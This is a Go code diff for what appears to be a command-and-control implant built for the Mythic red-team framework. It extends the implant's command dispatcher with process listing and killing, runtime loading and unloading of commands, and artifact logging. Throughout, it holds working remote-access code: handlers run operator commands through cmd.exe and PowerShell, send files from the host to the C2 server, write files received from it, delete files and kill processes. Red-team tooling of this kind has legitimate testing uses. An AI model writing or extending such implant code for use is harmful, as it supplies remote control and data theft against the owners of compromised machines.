@@ -20,16 +20,26 @@ type commandEntry struct {
 	run  func(a *Agent, t Task) (Response, bool)
 }
 
-var commandTable = []commandEntry{
-	{name: "shell", run: handleShell},
-	{name: "powershell", run: handlePowershell},
-	{name: "sleep", run: handleSleep},
-	{name: "ls", run: handleLs},
-	{name: "download", run: handleDownload},
-	{name: "upload", run: handleUpload},
-	{name: "rm", run: handleRm},
-	{name: "mkdir", run: handleMkdir},
-	{name: "exit", run: handleExit},
+// Built in init: load/unload handlers reference the table, so a package
+// var initializer would be an initialization cycle.
+var commandTable []commandEntry
+
+func init() {
+	commandTable = []commandEntry{
+		{name: "shell", run: handleShell},
+		{name: "powershell", run: handlePowershell},
+		{name: "sleep", run: handleSleep},
+		{name: "ls", run: handleLs},
+		{name: "download", run: handleDownload},
+		{name: "upload", run: handleUpload},
+		{name: "rm", run: handleRm},
+		{name: "mkdir", run: handleMkdir},
+		{name: "ps", run: handlePs},
+		{name: "kill", run: handleKill},
+		{name: "load", run: handleLoad},
+		{name: "unload", run: handleUnload},
+		{name: "exit", run: handleExit},
+	}
 }
 
 // dispatch runs one task and reports whether the agent must exit afterwards.
@@ -57,18 +67,58 @@ func findCommand(name string) *commandEntry {
 	return nil
 }
 
-// commandAllowed reports whether name is in the build-time command list.
-// An empty list (offline builds without -X) allows everything.
+// allowedCache is the runtime command allowlist, seeded from the
+// build-time list. load/unload flip entries; the cache rebuilds if the
+// build list changes under it (tests).
+var (
+	allowedCache map[string]bool
+	allowedCSV   string
+)
+
+// commandAllowed reports whether name may run right now. An empty
+// build list (offline builds without -X) allows everything.
 func commandAllowed(name string) bool {
-	if strings.TrimSpace(includedCommands) == "" {
-		return true
+	if allowedCache == nil || allowedCSV != includedCommands {
+		allowedCache = buildAllowed(includedCommands)
+		allowedCSV = includedCommands
 	}
-	for _, c := range strings.Split(includedCommands, ",") {
-		if strings.TrimSpace(c) == name {
-			return true
+	return allowedCache[name]
+}
+
+func buildAllowed(csv string) map[string]bool {
+	m := map[string]bool{}
+	if strings.TrimSpace(csv) == "" {
+		for i := range commandTable {
+			m[commandTable[i].name] = true
+		}
+		return m
+	}
+	for _, c := range strings.Split(csv, ",") {
+		if n := strings.TrimSpace(c); n != "" {
+			m[n] = true
 		}
 	}
-	return false
+	return m
+}
+
+// setCommandAllowed flips one command at runtime, false when unknown.
+func setCommandAllowed(name string, allowed bool) bool {
+	if findCommand(name) == nil {
+		return false
+	}
+	commandAllowed(name) // ensure initialized
+	allowedCache[name] = allowed
+	return true
+}
+
+// protectedRuntime mirrors the container: unloading these would strand
+// the callback.
+func protectedRuntime(name string) bool {
+	return name == "exit" || name == "load" || name == "unload"
+}
+
+func oneArtifact(base, artifact string) *[]Artifact {
+	return &[]Artifact{{BaseArtifact: base, Artifact: artifact}}
 }
 
 func errResponse(err error) (Response, bool) {
@@ -77,19 +127,27 @@ func errResponse(err error) (Response, bool) {
 }
 
 func handleShell(_ *Agent, t Task) (Response, bool) {
-	out, err := runShell(taskArg(t.Parameters))
+	arg := taskArg(t.Parameters)
+	out, err := runShell(arg)
+	resp := Response{UserOutput: out, Artifacts: oneArtifact("Process Create", "cmd.exe /c "+arg)}
 	if err != nil {
-		return Response{UserOutput: out, Status: "error: " + err.Error()}, false
+		resp.Status = "error: " + err.Error()
+		return resp, false
 	}
-	return Response{UserOutput: out, Status: "success"}, false
+	resp.Status = "success"
+	return resp, false
 }
 
 func handlePowershell(_ *Agent, t Task) (Response, bool) {
-	out, err := runPowershell(taskArg(t.Parameters))
+	arg := taskArg(t.Parameters)
+	out, err := runPowershell(arg)
+	resp := Response{UserOutput: out, Artifacts: oneArtifact("Process Create", "powershell.exe /c "+arg)}
 	if err != nil {
-		return Response{UserOutput: out, Status: "error: " + err.Error()}, false
+		resp.Status = "error: " + err.Error()
+		return resp, false
 	}
-	return Response{UserOutput: out, Status: "success"}, false
+	resp.Status = "success"
+	return resp, false
 }
 
 func handleSleep(a *Agent, t Task) (Response, bool) {
@@ -113,28 +171,32 @@ func handleLs(_ *Agent, t Task) (Response, bool) {
 }
 
 func handleDownload(a *Agent, t Task) (Response, bool) {
-	out, err := downloadToMythic(t.ID, taskArg(t.Parameters), a.chunkSize(), a.postResponses)
+	arg := taskArg(t.Parameters)
+	out, err := downloadToMythic(t.ID, arg, a.chunkSize(), a.posterFor())
 	if err != nil {
 		return errResponse(err)
 	}
-	return Response{UserOutput: out, Status: "success"}, false
+	return Response{UserOutput: out, Status: "success", Artifacts: oneArtifact("File Download", arg)}, false
 }
 
 func handleUpload(a *Agent, t Task) (Response, bool) {
+	remote := taskParam(t.Parameters, "remote_path")
 	out, err := uploadFromMythic(t.ID, taskParam(t.Parameters, "file"),
-		taskParam(t.Parameters, "remote_path"), a.chunkSize(), a.postResponses)
+		remote, a.chunkSize(), a.posterFor())
 	if err != nil {
 		return errResponse(err)
 	}
-	return Response{UserOutput: out, Status: "success"}, false
+	return Response{UserOutput: out, Status: "success", Artifacts: oneArtifact("File Upload", remote)}, false
 }
 
 func handleRm(_ *Agent, t Task) (Response, bool) {
-	removed, out, err := removePath(taskArg(t.Parameters))
+	arg := taskArg(t.Parameters)
+	removed, out, err := removePath(arg)
 	if err != nil {
 		return errResponse(err)
 	}
-	return Response{UserOutput: out, Status: "success", RemovedFiles: &removed}, false
+	return Response{UserOutput: out, Status: "success",
+		RemovedFiles: &removed, Artifacts: oneArtifact("File Delete", arg)}, false
 }
 
 func handleMkdir(_ *Agent, t Task) (Response, bool) {
@@ -143,6 +205,46 @@ func handleMkdir(_ *Agent, t Task) (Response, bool) {
 		return errResponse(err)
 	}
 	return Response{UserOutput: out, Status: "success"}, false
+}
+
+func handlePs(_ *Agent, _ Task) (Response, bool) {
+	entries, err := listProcesses()
+	if err != nil {
+		return errResponse(err)
+	}
+	procs := processesPayload(entries)
+	return Response{UserOutput: psText(entries), Status: "success", Processes: &procs}, false
+}
+
+func handleKill(_ *Agent, t Task) (Response, bool) {
+	pid, err := parseKillArg(taskArg(t.Parameters))
+	if err != nil {
+		return errResponse(err)
+	}
+	if err := killProcess(pid); err != nil {
+		return errResponse(err)
+	}
+	return Response{UserOutput: fmt.Sprintf("killed %d", pid), Status: "success",
+		Artifacts: oneArtifact("Process Kill", fmt.Sprintf("pid %d", pid))}, false
+}
+
+func handleLoad(_ *Agent, t Task) (Response, bool) {
+	name := strings.TrimSpace(taskArg(t.Parameters))
+	if !setCommandAllowed(name, true) {
+		return errResponse(fmt.Errorf("unknown command %s", name))
+	}
+	return Response{UserOutput: fmt.Sprintf("loaded %s", name), Status: "success"}, false
+}
+
+func handleUnload(_ *Agent, t Task) (Response, bool) {
+	name := strings.TrimSpace(taskArg(t.Parameters))
+	if protectedRuntime(name) {
+		return errResponse(fmt.Errorf("cannot unload %s", name))
+	}
+	if !setCommandAllowed(name, false) {
+		return errResponse(fmt.Errorf("unknown command %s", name))
+	}
+	return Response{UserOutput: fmt.Sprintf("unloaded %s", name), Status: "success"}, false
 }
 
 func handleExit(_ *Agent, _ Task) (Response, bool) {
